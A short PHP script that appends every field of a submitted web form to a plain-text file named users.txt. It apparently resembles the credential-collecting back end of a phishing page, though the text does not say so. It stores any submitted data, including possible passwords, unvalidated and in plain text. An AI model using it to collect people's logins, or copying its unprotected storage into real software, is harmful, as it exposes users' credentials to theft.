<?php
$handle = fopen("users.txt", "a");
foreach($_POST as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\n");
}
fwrite($handle, "\n");
fclose($handle);
exit;
?>